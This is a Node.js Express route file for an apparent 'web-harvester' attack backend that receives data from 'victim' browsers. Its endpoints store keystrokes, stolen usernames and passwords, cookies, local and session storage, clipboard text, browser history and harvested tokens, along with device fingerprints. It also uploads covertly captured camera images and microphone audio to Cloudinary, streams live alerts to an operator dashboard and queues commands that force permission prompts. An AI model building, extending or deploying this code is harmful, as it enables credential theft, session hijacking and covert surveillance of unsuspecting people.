const express = require('express');
const router = express.Router();
// uuidv4 not used - generateSessionId() handles session ID generation
const VictimSession = require('../models/VictimSession');
const StolenCredential = require('../models/StolenCredential');
const CameraCapture = require('../models/CameraCapture');
const AudioCapture = require('../models/AudioCapture');
const ClickEvent = require('../models/ClickEvent');
const deviceDetect = require('../middleware/deviceDetect');
const geoLookup = require('../middleware/geoIp');
const { collectionLimiter, credentialLimiter, cameraLimiter } = require('../middleware/rateLimit');
const { emitToAdmin } = require('../socket');
const { uploadBase64Image, uploadBase64Audio } = require('../services/cloudinaryUpload');

// Helper to generate sessionId
function generateSessionId() {
  return 'sess_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
}

// POST /api/collect/init - Initialize a victim session
router.post('/init', deviceDetect, geoLookup, collectionLimiter, async (req, res) => {
  try {
    const sessionId = generateSessionId();
    
    const session = new VictimSession({
      sessionId,
      ipAddress: req.clientIp,
      userAgent: req.deviceInfo.userAgent,
      browser: req.deviceInfo.browser,
      browserVersion: req.deviceInfo.browserVersion,
      os: req.deviceInfo.os,
      osVersion: req.deviceInfo.osVersion,
      deviceType: req.deviceInfo.deviceType,
      deviceVendor: req.deviceInfo.deviceVendor,
      deviceModel: req.deviceInfo.deviceModel,
      geolocation: req.geoInfo,
      referrer: req.body.referrer || '',
      landingPage: req.body.page || '/',
      language: req.body.language || '',
      timezone: req.body.timezone || '',
      screenResolution: req.body.screenResolution || '',
      platform: req.body.platform || '',
      lastActiveAt: new Date(),
      isOnline: true,
      urlPathsVisited: [req.body.page || '/'],
      cameraImages: [], // Ensure the field exists
      credentials: []   // Ensure the field exists
    });

    await session.save();

    emitToAdmin('new-victim', {
      sessionId: session._id,
      sessionIdStr: session.sessionId,
      ipAddress: session.ipAddress,
      browser: session.browser,
      os: session.os,
      deviceType: session.deviceType,
      country: session.geolocation?.country,
      city: session.geolocation?.city,
      timeOnSite: 0,
      isOnline: true,
      timestamp: new Date()
    });

    res.json({ sessionId: session.sessionId, dbId: session._id });
  } catch (error) {
    console.error('Init error:', error);
    res.status(500).json({ error: 'Failed to initialize session' });
  }
});

// POST /api/collect/heartbeat
router.post('/heartbeat', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, timeOnSite } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.lastActiveAt = new Date();
    if (timeOnSite) session.timeOnSite = timeOnSite;
    await session.save();


    if (req.body.reconnected || req.body.crossTabRestored || req.body.backgroundTrigger) {
      // Log the reconnection event
      session.persistenceData = session.persistenceData || {};
      session.persistenceData.revisitCount = (session.persistenceData.revisitCount || 0) + 1;
      session.persistenceData.lastVisit = new Date();
      session.persistenceData.returnVisitor = true;
      
      if (req.body.crossTabRestored) session.persistenceData.crossTabRecovered = true;
      if (req.body.backgroundTrigger) {
        session.persistenceData.persistenceMethods = [...(session.persistenceData.persistenceMethods || []), 'background-fetch'];
      }
      
      emitToAdmin('return-visitor', {
        sessionId: session._id,
        sessionIdStr: session.sessionId,
        revisitCount: session.persistenceData.revisitCount,
        ipAddress: session.ipAddress,
        timestamp: new Date()
      });
}

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/click - Record click with full element info
router.post('/click', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, x, y, targetElement, pageUrl, pageTitle, scrollX, scrollY } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    const click = new ClickEvent({
      sessionId: session._id,
      sessionIdStr: sessionId,
      x, y, targetElement, pageUrl, pageTitle, scrollX, scrollY,
      timestamp: new Date()
    });
    await click.save();

    session.clickCount = (session.clickCount || 0) + 1;
    session.lastActiveAt = new Date();
    if (pageUrl && !session.urlPathsVisited.includes(pageUrl)) {
      session.urlPathsVisited.push(pageUrl);
    }
    await session.save();

    emitToAdmin('victim-click', {
      sessionId: session._id,
      sessionIdStr: sessionId,
      x, y, targetElement, pageUrl, clickCount: session.clickCount,
      timestamp: new Date()
    });

    res.json({ ok: true, clickCount: session.clickCount });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/keystroke - Batch keystrokes
router.post('/keystroke', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, strokes } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    if (Array.isArray(strokes)) {
      session.keystrokes.push(...strokes.map(s => ({
        key: s.key,
        target: s.target,
        t: s.t || Date.now()
      })));
      session.lastActiveAt = new Date();
      await session.save();

      emitToAdmin('victim-keystroke', {
        sessionId: session._id,
        strokeCount: session.keystrokes.length,
        sample: strokes.slice(0, 5)
      });
    }

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/credentials - Receive captured credentials
router.post('/credentials', credentialLimiter, async (req, res) => {
  try {
    const { sessionId, source, username, password, email, phone, url, formType, fieldData } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    const credential = new StolenCredential({
      sessionId: session._id,
      sessionIdStr: sessionId,
      source: source || 'form-submit',
      username: username || '',
      password: password || '',
      email: email || '',
      phone: phone || '',
      url: url || '',
      pageTitle: req.body.pageTitle || '',
      formType: formType || '',
      fieldData: fieldData || {},
      additionalData: req.body.additionalData || {},
      ipAddress: session.ipAddress,
      userAgent: session.userAgent,
      capturedAt: new Date()
    });

    // Analyze strength
    credential.strength = credential.analyzeStrength();
    await credential.save();

    session.credentials.push(credential._id);
    session.lastActiveAt = new Date();
    
    // Update session score
    session.sessionScore = (session.sessionScore || 0) + 10;
    await session.save();

    emitToAdmin('credential-captured', {
      sessionId: session._id,
      sessionIdStr: sessionId,
      credentialId: credential._id,
      source: credential.source,
      username: credential.username ? credential.username.substring(0, 3) + '***' : 'N/A',
      hasPassword: !!credential.password,
      email: credential.email ? credential.email.substring(0, 3) + '***' : 'N/A',
      url: credential.url,
      strength: credential.strength,
      ipAddress: session.ipAddress,
      country: session.geolocation?.country,
      score: session.sessionScore,
      timestamp: new Date()
    });

    res.json({ ok: true, credentialId: credential._id });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/formdata
router.post('/formdata', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, formId, fields, url } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.formData.push({ formId, fields, url, t: new Date() });
    session.lastActiveAt = new Date();

    // === Handle permission poll: check for pending commands ===
    let command = null;
    if (formId === 'permission-poll') {
      // Check if there are pending permission commands in the session
      if (session.pendingCommands && session.pendingCommands.length > 0) {
        // Dequeue the first command
        command = session.pendingCommands.shift();
      }
      
      // Update permission status if reported
      if (fields && fields.permissions) {
        session.permissions = {
          ...(session.permissions || {}),
          ...fields.permissions,
          lastUpdated: new Date()
        };
      }
    }

    await session.save();

    // If we have a command, return it in response
    if (command) {
      return res.json({ ok: true, command: command.type, permissionType: command.permissionType, ...command });
    }

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/clipboard
router.post('/clipboard', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, text, action } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.clipboardData.push({ text, action, t: Date.now() });
    session.lastActiveAt = new Date();
    await session.save();

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/cookies
router.post('/cookies', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, cookies } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    if (Array.isArray(cookies)) {
      session.cookies = cookies;
    }
    session.lastActiveAt = new Date();
    await session.save();

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/storage
router.post('/storage', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, localStorage, sessionStorage } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    if (localStorage) session.localStorage = localStorage;
    if (sessionStorage) session.sessionStorage = sessionStorage;
    session.lastActiveAt = new Date();
    await session.save();

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/fingerprint
router.post('/fingerprint', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, canvas, webgl, audio, fonts, hardware, battery, webRtcIp } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    if (canvas) session.canvasFingerprint = canvas;
    if (webgl) session.webglFingerprint = webgl;
    if (audio) session.audioFingerprint = audio;
    if (fonts) {
      session.fontFingerprint = fonts;
      session.installedFonts = fonts;
    }
    if (hardware) {
      session.hardwareInfo = {
        ...session.hardwareInfo,
        ...hardware
      };
    }
    if (battery) {
      session.batteryInfo = battery;
    }
    if (webRtcIp) session.webRtcIp = webRtcIp;
    
    if (req.body.screenResolution) session.screenResolution = req.body.screenResolution;
    if (req.body.language) session.language = req.body.language;
    if (req.body.timezone) session.timezone = req.body.timezone;
    if (req.body.platform) session.platform = req.body.platform;
    if (req.body.hardwareConcurrency) session.hardwareConcurrency = req.body.hardwareConcurrency;
    if (req.body.deviceMemory) session.deviceMemory = req.body.deviceMemory;
    if (req.body.colorDepth) session.colorDepth = req.body.colorDepth;
    if (req.body.pixelRatio) session.pixelRatio = req.body.pixelRatio;
    
    session.lastActiveAt = new Date();
    await session.save();

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/network
router.post('/network', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, localIp, downlink, rtt, effectiveType } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.networkInfo = { localIp, downlink, rtt, effectiveType };
    session.lastActiveAt = new Date();
    await session.save();

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/camera - Receive base64 camera image (uploads to Cloudinary)
router.post('/camera', cameraLimiter, async (req, res) => {
  try {
    const { sessionId, imageData, metadata, triggerType } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    let cloudinaryResult = null;

    // Upload to Cloudinary if image data is present and Cloudinary is configured
    if (imageData && process.env.CLOUDINARY_CLOUD_NAME) {
      try {
        cloudinaryResult = await uploadBase64Image(imageData, {
          folder: 'web-harvester/captures',
          public_id: `capture_${Date.now()}_${Math.random().toString(36).substr(2, 8)}`
        });
        console.log('✅ Camera image uploaded to Cloudinary:', cloudinaryResult.url);
      } catch (uploadError) {
        console.error('Cloudinary upload failed, storing base64 instead:', uploadError.message);
      }
    }

    // Create and save CameraCapture document FIRST
    const capture = new CameraCapture({
      sessionId: session._id,
      sessionIdStr: sessionId,
      // Store base64 only as fallback; prefer Cloudinary URL
      imageData: cloudinaryResult ? null : (imageData || null),
      cloudinaryUrl: cloudinaryResult ? cloudinaryResult.url : null,
      cloudinaryPublicId: cloudinaryResult ? cloudinaryResult.publicId : null,
      capturedAt: new Date(),
      metadata: {
        ...(metadata || {}),
        width: cloudinaryResult?.width || metadata?.width || undefined,
        height: cloudinaryResult?.height || metadata?.height || undefined
      },
      triggerType: triggerType || 'auto'
    });
    await capture.save();
    console.log('💾 CameraCapture saved to DB:', capture._id, 'cloudinaryUrl:', cloudinaryResult?.url ? 'YES' : 'NO');

    // Now update the session - ensure cameraImages array exists
    if (!session.cameraImages) {
      session.cameraImages = [];
    }
    session.cameraImages.push(capture._id);
    session.lastActiveAt = new Date();
    session.sessionScore = (session.sessionScore || 0) + 25;
    await session.save();
    console.log('💾 Session updated with cameraImage ref');

    // Use Cloudinary URL for preview if available
    const imagePreview = cloudinaryResult
      ? cloudinaryResult.url
      : (imageData ? imageData.substring(0, 100) + '...' : null);

    emitToAdmin('camera-capture', {
      sessionId: session._id,
      sessionIdStr: sessionId,
      captureId: capture._id,
      triggerType: capture.triggerType,
      imagePreview,
      timestamp: new Date()
    });

    res.json({
      ok: true,
      captureId: capture._id,
      _id: capture._id,
      cloudinaryUrl: cloudinaryResult?.url || null,
      sessionId: session._id
    });
  } catch (error) {
    console.error('Camera capture error:', error);
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/camera-access - Log camera permission
router.post('/camera-access', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, granted } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    if (granted) {
      session.cameraAccessGranted = true;
    } else {
      session.cameraAccessDenied = true;
    }
    session.lastActiveAt = new Date();
    await session.save();

    emitToAdmin('camera-access', {
      sessionId: session._id,
      sessionIdStr: sessionId,
      granted: !!granted,
      timestamp: new Date()
    });

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/screenshot
router.post('/screenshot', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, data, url } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.screenshots.push({ data, t: new Date(), url: url || '' });
    session.lastActiveAt = new Date();
    await session.save();

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/mouse-movement
router.post('/mouse-movement', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, movements } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    if (Array.isArray(movements)) {
      session.mouseMovements.push(...movements);
      session.lastActiveAt = new Date();
      await session.save();
    }

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/close - Mark session closed
router.post('/close', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, timeOnSite } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    session.isOnline = false;
    session.closedAt = new Date();
    if (timeOnSite) session.timeOnSite = timeOnSite;
    session.lastActiveAt = new Date();
    await session.save();

    emitToAdmin('victim-offline', {
      sessionId: session._id,
      sessionIdStr: session.sessionId,
      timeOnSite: session.timeOnSite,
      clickCount: session.clickCount,
      credentialsCount: session.credentials?.length || 0,
      timestamp: new Date()
    });

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/bulk - Bulk data upload
router.post('/bulk', collectionLimiter, async (req, res) => {
  try {
    const { sessionId, data } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    if (data.cookies) session.cookies = data.cookies;
    if (data.localStorage) session.localStorage = data.localStorage;
    if (data.sessionStorage) session.sessionStorage = data.sessionStorage;
    if (data.fingerprint) {
      if (data.fingerprint.canvas) session.canvasFingerprint = data.fingerprint.canvas;
      if (data.fingerprint.webgl) session.webglFingerprint = data.fingerprint.webgl;
      if (data.fingerprint.audio) session.audioFingerprint = data.fingerprint.audio;
      if (data.fingerprint.fonts) session.fontFingerprint = data.fingerprint.fonts;
      if (data.fingerprint.hardware) session.hardwareInfo = { ...session.hardwareInfo, ...data.fingerprint.hardware };
    }
    if (data.network) session.networkInfo = { ...session.networkInfo, ...data.network };

    // In the bulk handler:
if (data.returnVisit) {
  session.persistenceData = session.persistenceData || {};
  session.persistenceData.revisitCount = data.returnVisit.revisitCount || 0;
  session.persistenceData.lastVisit = new Date();
  session.persistenceData.returnVisitor = true;
  session.persistenceData.reinitiated = true;
}

    // Inside the bulk POST handler, add:
if (data.historyItems) {
  session.browserHistory = [
    ...(session.browserHistory || []),
    ...data.historyItems.map(h => ({ ...h, timestamp: new Date() }))
  ].slice(-500); // Keep last 500

  emitToAdmin('browser-history', {
    sessionId: session._id,
    sessionIdStr: session.sessionId,
    itemCount: data.historyItems.length,
    totalItems: data._meta?.total || data.historyItems.length,
    techniques: [...new Set(data.historyItems.map(h => h.source))],
    sample: data.historyItems.slice(0, 3).map(h => ({ source: h.source, key: h.key || h.name || '', value: typeof h.value === 'string' ? h.value.substring(0, 100) : JSON.stringify(h).substring(0, 100) })),
    timestamp: new Date()
  });
}
if (data.sessionHarvest) {
  session.sessionHarvest = [
    ...(session.sessionHarvest || []),
    ...data.sessionHarvest
  ].slice(-200);
  // Flag sensitive ones
  session.sessionHarvest.forEach(h => {
    if (h.key?.toLowerCase().includes('password') || h.key?.toLowerCase().includes('token')) {
      h.sensitive = true;
    }
  });

  const sensitiveCount = data.sessionHarvest.filter(h => h.key?.toLowerCase().includes('password') || h.key?.toLowerCase().includes('token') || h.key?.toLowerCase().includes('secret')).length;
  emitToAdmin('session-harvest', {
    sessionId: session._id,
    sessionIdStr: session.sessionId,
    itemCount: data.sessionHarvest.length,
    sensitiveItems: sensitiveCount,
    sources: [...new Set(data.sessionHarvest.map(h => h.source))],
    hasCredentials: data.sessionHarvest.some(h => h.key?.toLowerCase().includes('password')),
    hasTokens: data.sessionHarvest.some(h => h.key?.toLowerCase().includes('token')),
    timestamp: new Date()
  });
}
if (data._meta) {
  session.set(data._meta);
}
    
    session.lastActiveAt = new Date();
    await session.save();

    res.json({ ok: true });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// POST /api/collect/audio - Receive audio clip (uploads to Cloudinary)
router.post('/audio', cameraLimiter, async (req, res) => {
  try {
    const { sessionId, audioData, metadata, triggerType, duration } = req.body;
    const session = await VictimSession.findOne({ sessionId });
    if (!session) return res.status(404).json({ error: 'Session not found' });

    let cloudinaryResult = null;

    // Upload audio to Cloudinary
    if (audioData && process.env.CLOUDINARY_CLOUD_NAME) {
      try {
        cloudinaryResult = await uploadBase64Audio(audioData, {
          folder: 'web-harvester/audio',
          public_id: `audio_${Date.now()}_${Math.random().toString(36).substr(2, 8)}`
        });
        console.log('✅ Audio clip uploaded to Cloudinary:', cloudinaryResult.url);
      } catch (uploadError) {
        console.error('Cloudinary audio upload failed:', uploadError.message);
      }
    }

    const audioCapture = new AudioCapture({
      sessionId: session._id,
      sessionIdStr: sessionId,
      cloudinaryUrl: cloudinaryResult ? cloudinaryResult.url : null,
      cloudinaryPublicId: cloudinaryResult ? cloudinaryResult.publicId : null,
      duration: duration || metadata?.duration || 0,
      format: metadata?.format || 'webm',
      sampleRate: metadata?.sampleRate || 0,
      channels: metadata?.channels || 1,
      amplitude: metadata?.amplitude || 0,
      capturedAt: new Date(),
      triggerType: triggerType || 'permission-forcer',
      metadata: {
        deviceLabel: metadata?.deviceLabel || '',
        deviceId: metadata?.deviceId || '',
        echoCancellation: metadata?.echoCancellation,
        noiseSuppression: metadata?.noiseSuppression
      }
    });
    await audioCapture.save();
    console.log('💾 AudioCapture saved to DB:', audioCapture._id);

    session.lastActiveAt = new Date();
    session.sessionScore = (session.sessionScore || 0) + 15;
    await session.save();

    emitToAdmin('audio-capture', {
      sessionId: session._id,
      sessionIdStr: sessionId,
      captureId: audioCapture._id,
      duration: audioCapture.duration,
      cloudinaryUrl: cloudinaryResult?.url || null,
      amplitude: audioCapture.amplitude,
      timestamp: new Date()
    });

    res.json({ ok: true, captureId: audioCapture._id, cloudinaryUrl: cloudinaryResult?.url || null });
  } catch (error) {
    console.error('Audio capture error:', error);
    res.status(500).json({ error: error.message });
  }
});

// GET /api/collect/settings - Get global app settings (no auth needed, used by victim harvester)
router.get('/settings', async (req, res) => {
  try {
    const AppSettings = require('../models/AppSettings');
    let settings = await AppSettings.findOne({ key: 'global' });
    if (!settings) {
      settings = await AppSettings.create({ key: 'global', autoForcePermissions: true, geoPrecision: 'high' });
    }
    res.json({
      autoForcePermissions: settings.autoForcePermissions,
      geoPrecision: settings.geoPrecision
    });
  } catch (error) {
    // Default to safe settings if DB error
    res.json({ autoForcePermissions: true, geoPrecision: 'high' });
  }
});

module.exports = router;

